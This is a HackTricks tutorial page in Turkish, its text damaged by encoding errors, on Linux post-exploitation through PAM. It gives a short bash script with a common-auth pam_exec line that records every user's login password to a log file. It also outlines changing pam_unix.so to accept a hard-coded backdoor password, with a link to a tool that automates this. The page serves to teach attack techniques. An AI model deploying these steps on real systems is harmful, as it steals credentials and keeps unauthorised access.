# Linux Post-Exploitation

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## PAM ile GiriÅŸ ParolalarÄ±nÄ± Dinleme

Her kullanÄ±cÄ±nÄ±n giriÅŸ yapmak iÃ§in kullandÄ±ÄŸÄ± parolayÄ± kaydetmek iÃ§in bir PAM modÃ¼lÃ¼ yapÄ±landÄ±ralÄ±m. PAM'Ä±n ne olduÄŸunu bilmiyorsanÄ±z kontrol edin:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**Daha fazla detay iÃ§in [orijinal gÃ¶nderiyi](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/) kontrol edin**. Bu sadece bir Ã¶zet:

**Teknik Genel BakÄ±ÅŸ:**
Eklentili Kimlik DoÄŸrulama ModÃ¼lleri (PAM), Unix tabanlÄ± sistemlerde kimlik doÄŸrulama yÃ¶netiminde esneklik sunar. GiriÅŸ sÃ¼reÃ§lerini Ã¶zelleÅŸtirerek gÃ¼venliÄŸi artÄ±rabilir, ancak kÃ¶tÃ¼ye kullanÄ±ldÄ±ÄŸÄ±nda riskler de oluÅŸturabilir. Bu Ã¶zet, PAM kullanarak giriÅŸ kimlik bilgilerini yakalamak iÃ§in bir tekniÄŸi ve azaltma stratejilerini Ã¶zetlemektedir.

**Kimlik Bilgilerini Yakalama:**
- `toomanysecrets.sh` adlÄ± bir bash betiÄŸi, giriÅŸ denemelerini kaydetmek iÃ§in oluÅŸturulmuÅŸtur; tarih, kullanÄ±cÄ± adÄ± (`$PAM_USER`), parola (stdin Ã¼zerinden) ve uzak ana bilgisayar IP'si (`$PAM_RHOST`) `/var/log/toomanysecrets.log` dosyasÄ±na kaydedilir.
- Betik Ã§alÄ±ÅŸtÄ±rÄ±labilir hale getirilir ve `pam_exec.so` modÃ¼lÃ¼ kullanÄ±larak PAM yapÄ±landÄ±rmasÄ±na (`common-auth`) entegre edilir; bu, sessizce Ã§alÄ±ÅŸtÄ±rma ve kimlik doÄŸrulama belirtecini betiÄŸe aÃ§ma seÃ§enekleri ile yapÄ±lÄ±r.
- Bu yaklaÅŸÄ±m, ele geÃ§irilmiÅŸ bir Linux ana bilgisayarÄ±nÄ±n kimlik bilgilerini gizlice kaydetmek iÃ§in nasÄ±l istismar edilebileceÄŸini gÃ¶stermektedir.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### PAM'Ä± Arka KapÄ± ile DeÄŸiÅŸtirme

**Daha fazla detay iÃ§in [orijinal yazÄ±ya](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9) bakÄ±n**. Bu sadece bir Ã¶zet:

Eklentili Kimlik DoÄŸrulama ModÃ¼lÃ¼ (PAM), Linux altÄ±nda kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lan bir sistemdir. ÃœÃ§ ana kavram Ã¼zerinde Ã§alÄ±ÅŸÄ±r: **kullanÄ±cÄ± adÄ±**, **ÅŸifre** ve **hizmet**. Her hizmet iÃ§in yapÄ±landÄ±rma dosyalarÄ± `/etc/pam.d/` dizininde bulunur; burada paylaÅŸÄ±lan kÃ¼tÃ¼phaneler kimlik doÄŸrulamasÄ±nÄ± yÃ¶netir.

**AmaÃ§**: PAM'Ä±, belirli bir ÅŸifre ile kimlik doÄŸrulamasÄ±na izin verecek ÅŸekilde deÄŸiÅŸtirmek, gerÃ§ek kullanÄ±cÄ± ÅŸifresini atlayarak. Bu, neredeyse tÃ¼m hizmetler tarafÄ±ndan ÅŸifre doÄŸrulamasÄ± iÃ§in kullanÄ±lan `common-auth` dosyasÄ±nda yer alan `pam_unix.so` paylaÅŸÄ±lan kÃ¼tÃ¼phanesine Ã¶zellikle odaklanmaktadÄ±r.

### `pam_unix.so`'yu DeÄŸiÅŸtirme AdÄ±mlarÄ±:

1. **common-auth** dosyasÄ±nda Kimlik DoÄŸrulama YÃ¶nergesini Bulun:
- Bir kullanÄ±cÄ±nÄ±n ÅŸifresini kontrol eden satÄ±r `pam_unix.so`'yu Ã§aÄŸÄ±rÄ±r.
2. **Kaynak Kodunu DeÄŸiÅŸtirin**:
- `pam_unix_auth.c` kaynak dosyasÄ±na, Ã¶nceden tanÄ±mlanmÄ±ÅŸ bir ÅŸifre kullanÄ±ldÄ±ÄŸÄ±nda eriÅŸim izni veren bir koÅŸullu ifade ekleyin, aksi takdirde normal kimlik doÄŸrulama sÃ¼recine devam edin.
3. **Derleyin ve DeÄŸiÅŸtirilmiÅŸ** `pam_unix.so` kÃ¼tÃ¼phanesini uygun dizinde deÄŸiÅŸtirin.
4. **Test**:
- Ã–nceden tanÄ±mlanmÄ±ÅŸ ÅŸifre ile Ã§eÅŸitli hizmetlere (giriÅŸ, ssh, sudo, su, ekran koruyucu) eriÅŸim izni verilirken, normal kimlik doÄŸrulama sÃ¼reÃ§leri etkilenmez.

{% hint style="info" %}
Bu sÃ¼reci [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor) ile otomatikleÅŸtirebilirsiniz.
{% endhint %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
